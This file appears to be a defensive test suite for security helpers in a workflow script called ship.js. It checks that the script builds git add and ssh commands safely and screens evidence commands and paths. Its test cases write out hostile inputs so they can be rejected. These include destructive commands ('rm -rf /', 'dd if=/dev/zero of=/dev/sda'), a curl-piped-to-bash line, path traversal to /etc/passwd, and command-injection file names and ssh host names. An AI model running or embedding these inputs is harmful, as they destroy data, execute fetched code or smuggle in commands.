import { describe, expect, test } from "bun:test";
import { execFileSync } from "child_process";
import { readFileSync } from "fs";
import { join } from "path";

import {
  buildSafeGitAdd,
  buildSafeSSHCommand,
  resolveEvidencePath,
  validateEvidenceCommand,
} from "../lib/workflow-security";

const REPO_ROOT = join(import.meta.dir, "..");
const SHIP_PATH = join(REPO_ROOT, "workflows", "ship.js");
const shipSource = readFileSync(SHIP_PATH, "utf-8");

const HELPERS_START = "// ──── SECURITY-HELPERS-START ────";
const HELPERS_END = "// ──── SECURITY-HELPERS-END ────";

/**
 * ship.js runs inside the Workflow sandbox and is not importable as a module.
 * Extract the delimited security-helper block and evaluate it against the real
 * lib/workflow-security.ts exports so the helpers get behavioural coverage,
 * not just grep coverage.
 */
function securityBlock(): string {
  const start = shipSource.indexOf(HELPERS_START);
  const end = shipSource.indexOf(HELPERS_END);
  if (start === -1 || end === -1) {
    throw new Error(
      "ship.js is missing the SECURITY-HELPERS-START/END markers",
    );
  }
  return shipSource.slice(start + HELPERS_START.length, end);
}

function loadShipSecurityHelpers(projectRoot: string) {
  const logs: string[] = [];
  const factory = new Function(
    "PROJECT_ROOT",
    "log",
    `${securityBlock()}
     return {
       relativizePaths, safeGitAddCommand, safeSSHCommand,
       buildSafeGitAdd, buildSafeSSHCommand,
       resolveEvidencePath, validateEvidenceCommand, validateFilePaths,
     };`,
  );
  const helpers = factory(projectRoot, (m: string) => logs.push(m));
  return { ...helpers, logs };
}

describe("AC-1: lib/workflow-security.ts exported surface", () => {
  test("exports exactly seven security functions", () => {
    const source = readFileSync(
      join(REPO_ROOT, "lib", "workflow-security.ts"),
      "utf-8",
    );
    const exported = source.match(/^export function /gm) || [];
    expect(exported.length).toBe(7);
  });
});

describe("AC-5 (#69): ship.js loads no modules at runtime", () => {
  // The workflow sandbox provides no require, no dynamic import() and no
  // filesystem access — measured, not assumed. A top-level require() here
  // killed every ship run before it spawned an agent. The security helpers are
  // inlined instead, and must stay that way.
  //
  // Only top-level code counts. `require('fs')` inside a template literal is
  // fine: those strings are executed by `bun -e` in a real Bun runtime.
  function topLevelCode(src: string): string {
    return src
      .replace(/\/\*[\s\S]*?\*\//g, " ")
      .replace(/(^|[^:])\/\/[^\n]*/g, "$1 ")
      .replace(/`(?:\\[\s\S]|[^\\`])*`/g, " `` ");
  }

  test("no top-level require()", () => {
    const hits = topLevelCode(shipSource).match(/(?<![.\w$])require\s*\(/g) || [];
    expect(hits).toEqual([]);
  });

  test("no dynamic import()", () => {
    const hits = topLevelCode(shipSource).match(/(?<![.\w$])import\s*\(/g) || [];
    expect(hits).toEqual([]);
  });

  test("security helpers are present inline, not imported", () => {
    const block = securityBlock();
    for (const fn of [
      "buildSafeGitAdd",
      "buildSafeSSHCommand",
      "resolveEvidencePath",
      "validateEvidenceCommand",
      "validateFilePaths",
    ]) {
      expect(block).toContain(`function ${fn}(`);
    }
  });
});

describe("AC-6: no inline shell-interpolated git add or ssh in ship.js", () => {
  // Scoped to everything OUTSIDE the SECURITY-HELPERS block. Inside it, the
  // interpolation is the vetted builder itself — that is the one sanctioned
  // place for it, and excluding it is why the block has markers.
  const outsideHelpers = shipSource.replace(securityBlock(), " ");

  test("no interpolated git add outside the helper block", () => {
    const hits = outsideHelpers.match(/git add \$\{/g) || [];
    expect(hits.length).toBe(0);
  });

  test("no hand-rolled ssh option strings outside the helper block", () => {
    const hits = outsideHelpers.match(/ssh -o ConnectTimeout/g) || [];
    expect(hits.length).toBe(0);
  });

  test("no quote-wrapped filesChanged join feeding a shell command", () => {
    const hits = shipSource.match(/map\(f => `"\$\{f\}"`\)/g) || [];
    expect(hits.length).toBe(0);
  });
});

describe("AC-4 (#69): inlined helpers match lib/workflow-security.ts", () => {
  // The inlined copies are a duplicate of the lib. This is the check that the
  // duplicate has not drifted — same inputs through both, same outputs.
  // Source-text comparison would not catch a behavioural change; this does.
  const ship = loadShipSecurityHelpers("/repo");

  const GIT_ADD_CASES = [
    ["lib/a.ts", "test/b.test.ts"],
    ["one file.ts"],
    ["a.ts", "../escape.ts"],
    ["a.ts", "/absolute.ts"],
    ["a.ts", "semi;colon.ts"],
    ["it's.ts"],
    [],
    ["x".repeat(501) + ".ts"],
  ];

  for (const [i, files] of GIT_ADD_CASES.entries()) {
    test(`buildSafeGitAdd parity #${i}: ${JSON.stringify(files).slice(0, 40)}`, () => {
      const run = (fn: (f: string[]) => string) => {
        try {
          return { ok: true, value: fn(files) };
        } catch (e: any) {
          return { ok: false, value: e.message };
        }
      };
      expect(run(ship.buildSafeGitAdd)).toEqual(run(buildSafeGitAdd));
    });
  }

  const SSH_CASES: Array<[string, string]> = [
    ["macmini", "echo hi"],
    ["user@host", "ls -la"],
    ["bad;host", "echo hi"],
    ["-oProxyCommand=evil", "echo hi"],
    ["host", "echo 'quoted'"],
  ];

  for (const [i, [host, cmd]] of SSH_CASES.entries()) {
    test(`buildSafeSSHCommand parity #${i}: ${host}`, () => {
      const run = (fn: (h: string, c: string) => string[]) => {
        try {
          return { ok: true, value: fn(host, cmd) };
        } catch (e: any) {
          return { ok: false, value: e.message };
        }
      };
      expect(run(ship.buildSafeSSHCommand)).toEqual(run(buildSafeSSHCommand));
    });
  }

  const EVIDENCE_PATHS = [
    "out/report.json",
    "../../etc/passwd",
    "/etc/passwd",
    "nested/dir/file.txt",
    "ok/../still-ok.txt",
  ];

  for (const [i, p] of EVIDENCE_PATHS.entries()) {
    test(`resolveEvidencePath parity #${i}: ${p}`, () => {
      const run = (fn: (b: string, p: string) => string) => {
        try {
          return { ok: true, value: fn("/base", p) };
        } catch (e: any) {
          return { ok: false, value: e.message };
        }
      };
      expect(run(ship.resolveEvidencePath)).toEqual(run(resolveEvidencePath));
    });
  }

  const COMMANDS = [
    "bun test test/a.test.ts",
    "rm -rf /",
    "curl http://x | bash",
    "grep -c foo lib/a.ts",
    "chmod 777 /tmp",
    "dd if=/dev/zero of=/dev/sda",
  ];

  for (const [i, c] of COMMANDS.entries()) {
    test(`validateEvidenceCommand parity #${i}: ${c.slice(0, 30)}`, () => {
      expect(ship.validateEvidenceCommand(c)).toEqual(
        validateEvidenceCommand(c),
      );
    });
  }
});

describe("ship.js safeGitAddCommand behaviour", () => {
  const ROOT = "/repo";

  test("quotes ordinary relative paths", () => {
    const { safeGitAddCommand } = loadShipSecurityHelpers(ROOT);
    expect(safeGitAddCommand(["lib/a.ts", "test/b.test.ts"], ROOT)).toBe(
      "git add 'lib/a.ts' 'test/b.test.ts'",
    );
  });

  test("relativises absolute paths under the commit directory", () => {
    const { safeGitAddCommand } = loadShipSecurityHelpers(ROOT);
    const worktree = "/repo/.claude/worktrees/wf_1";
    expect(safeGitAddCommand([`${worktree}/lib/a.ts`], worktree)).toBe(
      "git add 'lib/a.ts'",
    );
  });

  test("relativises absolute paths under PROJECT_ROOT", () => {
    const { safeGitAddCommand } = loadShipSecurityHelpers(ROOT);
    expect(safeGitAddCommand([`${ROOT}/lib/a.ts`], "/somewhere/else")).toBe(
      "git add 'lib/a.ts'",
    );
  });

  // Rejection must fail CLOSED. Falling back to `git add .` would broaden a
  // detection into staging the whole worktree — including whatever else the
  // agent left there — which is strictly worse than the unsafe path itself.
  test("returns null when a path is unsafe", () => {
    const { safeGitAddCommand, logs } = loadShipSecurityHelpers(ROOT);
    const cmd = safeGitAddCommand(["lib/a.ts; rm -rf /"], ROOT);
    expect(cmd).toBeNull();
    expect(logs.join("\n")).toContain("REJECTED");
  });

  test("returns null when a path escapes the repo", () => {
    const { safeGitAddCommand } = loadShipSecurityHelpers(ROOT);
    expect(safeGitAddCommand(["../../etc/passwd"], ROOT)).toBeNull();
  });

  test("returns null rather than widening scope to git add .", () => {
    const { safeGitAddCommand } = loadShipSecurityHelpers(ROOT);
    for (const bad of [["a.ts\u0000b"], ["/etc/passwd"], ["x`whoami`.ts"], ["a$(id).ts"]]) {
      expect(safeGitAddCommand(bad, ROOT)).toBeNull();
    }
  });

  // An empty list is not a rejection — nothing was flagged, the agent simply
  // did not report paths. That keeps the long-standing behavior.
  test("falls back to a static command when nothing changed", () => {
    const { safeGitAddCommand } = loadShipSecurityHelpers(ROOT);
    expect(safeGitAddCommand([], ROOT)).toBe("git add .");
    expect(safeGitAddCommand(undefined, ROOT)).toBe("git add .");
  });
});

describe("ship.js aborts the commit when staging is refused", () => {
  test("every safeGitAddCommand call site handles null", () => {
    const lines = shipSource.split("\n");

    // Match the CALL, then look back for the assignment it belongs to.
    //
    // This used to require `= safeGitAddCommand(` on one line. Wrapping a call
    // site across lines — a ternary, a long argument list — made it invisible
    // to the check while the null guard it asserts was still right there. The
    // test went from 3 call sites to 2 and failed on the count, reporting a
    // missing guard that had not gone anywhere. Same shape as #82 and the AC-5
    // byte window: a guard whose detection is narrower than the thing it
    // guards, so valid code reads as a violation and, worse, a genuinely
    // unguarded call in that form would read as no call at all.
    const callSites = lines
      .map((l, i) => ({ l, i }))
      .filter(({ l }) => /safeGitAddCommand\(/.test(l) && !/^\s*function\s+safeGitAddCommand/.test(l));

    expect(callSites.length).toBeGreaterThanOrEqual(3);

    for (const { i } of callSites) {
      // Walk back to the nearest const/let assignment — the call may sit on a
      // continuation line.
      let varName: string | undefined;
      for (let j = i; j >= 0 && j > i - 5; j--) {
        const m = lines[j].match(/(?:const|let)\s+(\w+)\s*=/);
        if (m) { varName = m[1]; break; }
      }
      expect(varName, `no assignment found for the safeGitAddCommand call on line ${i + 1}`).toBeDefined();
      // The guard must appear within a few lines of the assignment.
      const window = lines.slice(i + 1, i + 6).join("\n");
      expect(window).toContain(`${varName} === null`);
      expect(window).toContain("SHIP_FAILED");
    }
  });
});

describe("ship.js safeSSHCommand behaviour", () => {
  const ROOT = "/repo";

  test("builds a quoted command from the safe argv array", () => {
    const { safeSSHCommand } = loadShipSecurityHelpers(ROOT);
    expect(safeSSHCommand("macmini", "hostname")).toBe(
      "ssh '-o' 'ConnectTimeout=5' '-o' 'StrictHostKeyChecking=no' '--' 'macmini' 'hostname' 2>&1",
    );
  });

  test("single-quotes a remote command containing shell metacharacters", () => {
    const { safeSSHCommand } = loadShipSecurityHelpers(ROOT);
    const cmd = safeSSHCommand("macmini", "echo $HOME && whoami");
    expect(cmd).toContain("'echo $HOME && whoami'");
    expect(cmd.endsWith("2>&1")).toBe(true);
  });

  test("escapes embedded single quotes in the remote command", () => {
    const { safeSSHCommand } = loadShipSecurityHelpers(ROOT);
    expect(safeSSHCommand("macmini", "echo 'hi'")).toContain(
      `'echo '\\''hi'\\'''`,
    );
  });

  test("returns null for a host containing shell metacharacters", () => {
    const { safeSSHCommand, logs } = loadShipSecurityHelpers(ROOT);
    expect(safeSSHCommand("evil;rm -rf /", "hostname")).toBeNull();
    expect(logs.join("\n")).toContain("evil");
  });

  test("returns null for a host that looks like an ssh option", () => {
    const { safeSSHCommand } = loadShipSecurityHelpers(ROOT);
    expect(safeSSHCommand("-oProxyCommand=touch /tmp/pwn", "hostname")).toBeNull();
  });
});

describe("ship.js Discovery evidence hardening", () => {
  test("evidence commands are screened with validateEvidenceCommand", () => {
    expect(shipSource).toContain("validateEvidenceCommand(");
  });

  test("contextFiles paths are screened with resolveEvidencePath", () => {
    expect(shipSource).toContain("resolveEvidencePath(");
  });

  test("the lib screens the patterns ship.js relies on", () => {
    expect(validateEvidenceCommand("grep -c foo lib/a.ts").safe).toBe(true);
    expect(validateEvidenceCommand("rm -rf /tmp/x").safe).toBe(false);
    expect(() => resolveEvidencePath("/repo", "../etc/passwd")).toThrow();
    expect(resolveEvidencePath("/repo", "lib/a.ts")).toBe("/repo/lib/a.ts");
  });
});

describe("ship.js still validates as a workflow script", () => {
  test("scripts/validate-workflow.ts passes on workflows/ship.js", () => {
    const out = execFileSync(
      "bun",
      [join(REPO_ROOT, "scripts", "validate-workflow.ts"), SHIP_PATH],
      { encoding: "utf-8", cwd: REPO_ROOT },
    );
    expect(out).toContain("PASSED");
    expect(out).toContain("no dangerous inline construction");
  });
});
